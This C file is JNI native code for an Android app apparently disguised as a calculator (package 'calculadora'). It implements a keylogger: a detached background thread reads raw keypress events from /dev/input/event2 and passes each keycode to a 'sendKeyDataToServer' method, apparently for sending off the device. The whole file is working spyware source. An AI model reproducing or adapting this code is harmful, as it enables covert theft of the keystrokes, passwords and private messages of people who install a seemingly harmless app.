#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <jni.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/input.h>

#define UNUSED __attribute__((unused))


static JavaVM* javaVM = NULL;
static jobject globalObj = NULL;


JNIEXPORT void JNICALL Java_com_agenciacristal_calculadora_Keylogger_sendKeyDataToServer(
        JNIEnv* env,
        jobject obj,
        jint keyCode
) {

    jclass keyloggerClass = (*env)->GetObjectClass(env, obj);


    jmethodID methodID = (*env)->GetMethodID(env, keyloggerClass, "sendKeyDataToServer", "(I)V");

    if (methodID == NULL) {
        printf("Error: couldn't find method sendKeyDataToServer\n");
        return;
    }


    (*env)->CallVoidMethod(env, obj, methodID, keyCode);
}

void* keylogger_thread(void* UNUSED arg) {
    JNIEnv* env;

    (*javaVM)->AttachCurrentThread(javaVM, &env, NULL);


    int fd = open("/dev/input/event2", O_RDONLY);
    if (fd < 0) {
        perror("Error opening input device");
        (*javaVM)->DetachCurrentThread(javaVM);
        pthread_exit(NULL);
    }

    struct input_event event;
    while (read(fd, &event, sizeof(struct input_event)) > 0) {
        if (event.type == EV_KEY && event.value == 1) {
            Java_com_agenciacristal_calculadora_Keylogger_sendKeyDataToServer(env, globalObj, event.code);
        }
    }

    close(fd);
    (*javaVM)->DetachCurrentThread(javaVM);
    pthread_exit(NULL);
}

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* UNUSED reserved) {
    javaVM = vm;
    return JNI_VERSION_1_6;
}

JNIEXPORT void JNICALL Java_com_agenciacristal_calculadora_Keylogger_startLogging(
        JNIEnv* env,
        jobject obj
) {

    globalObj = (*env)->NewGlobalRef(env, obj);

    pthread_t thread;
    if (pthread_create(&thread, NULL, keylogger_thread, NULL) != 0) {
        perror("Error creating thread");
        return;
    }
    pthread_detach(thread);
}